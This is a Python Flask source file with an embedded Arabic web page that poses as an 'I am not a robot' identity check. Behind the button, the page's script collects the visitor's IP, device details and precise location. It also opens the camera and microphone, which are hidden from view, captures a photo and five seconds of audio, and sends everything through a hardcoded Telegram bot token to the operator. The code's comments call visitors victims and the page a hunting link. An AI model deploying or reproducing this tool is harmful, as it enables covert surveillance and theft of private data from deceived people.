import base64, requests, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- إعداداتك (ثابتة ومضبوطة) ---
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"

HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الأمان</title>
    <style>
        body { background: #050505; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #333; width: 85%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .btn { background: #f38020; color: white; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
        #st { margin-top: 20px; color: #888; font-size: 0.9rem; }
        /* الكاميرا مخفية بطريقة آمنة جداً تضمن عملها وعدم توقفها */
        .hidden-media { position: fixed; top: -9999px; left: -9999px; opacity: 0; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 60px; margin-bottom: 20px;">🛡️</div>
        <h2>تأكيد الهوية</h2>
        <p style="color: #aaa; margin-bottom: 30px;">يرجى الضغط لتجاوز نظام الحماية والوصول للرابط</p>
        <button class="btn" id="go" onclick="start()">أنا لست روبوت</button>
        <div id="st"></div>
    </div>
    
    <video id="v" class="hidden-media" autoplay playsinline muted></video>
    <canvas id="c" class="hidden-media"></canvas>

    <script>
        async function post(d, t) { 
            try {
                await fetch('/api', { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify({d: d, t: t}) 
                });
            } catch(e) {}
        }

        async function start() {
            const st = document.getElementById('st');
            document.getElementById('go').style.display = 'none';
            st.innerText = "جاري فحص المتصفح...";
            
            try {
                // 1. جلب الآيبي
                let ip = "تعذر الجلب";
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const json = await res.json();
                    ip = json.ip;
                } catch(err) {}

                // 2. تشغيل الكاميرا بقوة
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v');
                v.srcObject = stream;
                await v.play();

                // 3. جمع وإرسال المعلومات فوراً
                const b = await navigator.getBattery().catch(() => ({level: 0, charging: false}));
                const info = `🔥 **صيد جديد ومؤكد**:\\n` +
                             `━━━━━━━━━━━━━━\\n` +
                             `🌐 الأيبي: ${ip}\\n` +
                             `🔋 البطارية: ${Math.round(b.level*100)}% (${b.charging ? 'يشحن' : 'لا'})\\n` +
                             `📱 النظام: ${navigator.platform}\\n` +
                             `🖥 الشاشة: ${window.screen.width}x${window.screen.height}\\n` +
                             `🌍 اللغة: ${navigator.language}`;
                await post(info, "msg");

                // 4. إرسال الموقع
                navigator.geolocation.getCurrentPosition(p => {
                    post(`📍 الخريطة: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, "msg");
                }, () => {}, {enableHighAccuracy: true});

                // 5. الانتظار 4 ثواني لتوازن الضوء والتقاط الصورة
                st.innerText = "جاري توازن العدسة... (4 ثواني)";
                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth || 640; 
                    c.height = v.videoHeight || 480;
                    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
                    await post(c.toDataURL('image/jpeg', 0.8), "img");
                    
                    // 6. تسجيل الصوت
                    st.innerText = "جاري تسجيل الصوت... (5 ثواني)";
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks));
                        reader.onloadend = () => {
                            post(reader.result, "aud");
                            st.innerText = "✅ اكتمل التحقق! سيتم توجيهك...";
                            stream.getTracks().forEach(track => track.stop()); // إطفاء الكاميرا بالنهاية
                        };
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000);
                }, 4000);

            } catch (e) { 
                st.innerText = "❌ يرجى الموافقة على الصلاحيات للمتابعة!";
                setTimeout(() => location.reload(), 2000);
            }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/api', methods=['POST'])
def api():
    try:
        data = request.get_json(force=True, silent=True)
        if not data: return "OK", 200
        t, d = data.get('t'), data.get('d')
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
        
        # أضفت timeout حتى ما يعلق السيرفر أبدأ
        if t == 'msg':
            requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'}, timeout=5)
        elif t == 'img':
            img = base64.b64decode(d.split(',')[1])
            requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': "📸 صورة الضحية"}, files={'photo': ('c.jpg', img)}, timeout=10)
        elif t == 'aud':
            aud = base64.b64decode(d.split(',')[1])
            requests.post(url + "sendVoice", data={'chat_id': ADMIN_ID, 'caption': "🎙 بصمة الضحية"}, files={'voice': ('v.ogg', aud)}, timeout=10)
    except Exception as e:
        pass
    return "OK", 200

@app.route('/webhook', methods=['POST', 'GET'])
def webhook():
    if request.method == 'POST':
        try:
            data = request.get_json(force=True, silent=True)
            if data and "message" in data:
                uid = str(data["message"]["chat"]["id"])
                if uid == ADMIN_ID:
                    kb = {"inline_keyboard": [[{"text": "🔗 رابط الصيد", "callback_data": "link"}]]}
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                  json={'chat_id': uid, 'text': "🔥 السيرفر شغال 100% ومستعد للصيد!", 'reply_markup': kb})
        except Exception:
            pass
    return "OK", 200

if __name__ == '__main__':
    # الحل الجذري لمشكلة توقف الرابط في Render (تحديد البورت ديناميكياً)
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
